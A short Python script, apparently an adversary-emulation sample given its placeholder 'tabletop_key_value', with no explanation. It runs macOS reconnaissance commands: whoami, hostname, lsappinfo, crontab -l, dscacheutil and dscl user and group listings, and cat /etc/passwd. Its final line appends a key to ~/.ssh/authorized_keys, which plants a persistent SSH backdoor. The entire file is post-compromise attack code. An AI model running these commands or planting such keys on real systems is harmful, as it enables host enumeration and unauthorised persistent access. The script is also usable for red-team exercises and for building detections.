import os
os.system('whoami')
os.system('hostname')
os.system('lsappinfo list')
os.system('crontab -l')
os.system('dscacheutil -q user')
os.system('dscl . ls /Groups')
os.system('cat /etc/passwd')
os.system('echo "tabletop_key_value" >> ~/.ssh/authorized_keys')
